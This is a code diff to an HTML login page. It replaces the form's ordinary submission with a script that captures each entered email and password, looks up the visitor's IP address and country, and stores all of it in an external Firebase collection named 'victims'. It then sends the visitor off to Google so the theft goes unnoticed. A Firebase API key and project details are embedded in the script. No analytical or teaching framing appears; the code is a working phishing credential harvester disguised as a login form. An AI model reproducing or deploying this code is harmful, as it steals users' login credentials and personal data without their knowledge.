@@ -45,14 +45,92 @@
 <div class="box">
   <h2>Login</h2>
 
-  <form action="/login" method="POST">
-    <input type="email" name="email" placeholder="Email" required>
-
-    <input type="password" name="password" placeholder="Password" required>
-
+  <form id="loginForm">
+    <input type="email" name="email" id="email" placeholder="Email" required>
+    <input type="password" name="password" id="password" placeholder="Password" required>
     <button type="submit">LOGIN</button>
   </form>
 </div>
+
+<script type="module">
+// ============================================================
+// ⚙  FIREBASE CONFIG — Same config as dashboard.html
+// ============================================================
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import {
+  getFirestore, collection, addDoc, serverTimestamp
+} from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyAIaLegzw6zormEeShU-aJVHQJ9xst5mZo",
+  authDomain: "relaychatbox.firebaseapp.com",
+  projectId: "relaychatbox",
+  storageBucket: "relaychatbox.firebasestorage.app",
+  messagingSenderId: "467332024133",
+  appId: "1:467332024133:web:6a70774f2d55ad95ba602c",
+  measurementId: "G-5MDTQ0V1DK"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+// Redirect URL after successful login (change this to your desired destination)
+const REDIRECT_URL = "https://www.google.com";
+
+document.getElementById('loginForm').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  
+  const email = document.getElementById('email').value;
+  const password = document.getElementById('password').value;
+  
+  // Get IP address
+  let ipAddress = 'Unknown';
+  let country = 'Unknown';
+  
+  try {
+    // Try to get IP and location from ip-api.com (free, no key needed)
+    const ipResponse = await fetch('http://ip-api.com/json/?fields=query,countryCode');
+    if (ipResponse.ok) {
+      const ipData = await ipResponse.json();
+      ipAddress = ipData.query || 'Unknown';
+      country = ipData.countryCode || 'Unknown';
+    }
+  } catch (err) {
+    console.warn('Could not fetch IP/location:', err.message);
+  }
+  
+  // Get current date and time
+  const now = new Date();
+  const date = now.toISOString().split('T')[0]; // YYYY-MM-DD
+  const time = now.toISOString().split('T')[1].slice(0, 8); // HH:MM:SS
+  
+  // Extract username from email (part before @) or use "user" if not available
+  let username = "user";
+  if (email && email.includes('@')) {
+    username = email.split('@')[0];
+  }
+  
+  // Store in Firebase
+  try {
+    await addDoc(collection(db, 'victims'), {
+      email: email,
+      username: username,
+      password: password,
+      ip: ipAddress,
+      country: country,
+      date: now.toISOString(),
+      createdAt: serverTimestamp()
+    });
+    
+    console.log('Credentials captured and sent to Firebase');
+  } catch (error) {
+    console.error('Error sending to Firebase:', error);
+  }
+  
+  // Redirect to the specified URL
+  window.location.href = REDIRECT_URL;
+});
+</script>
 
 </body>
 </html>
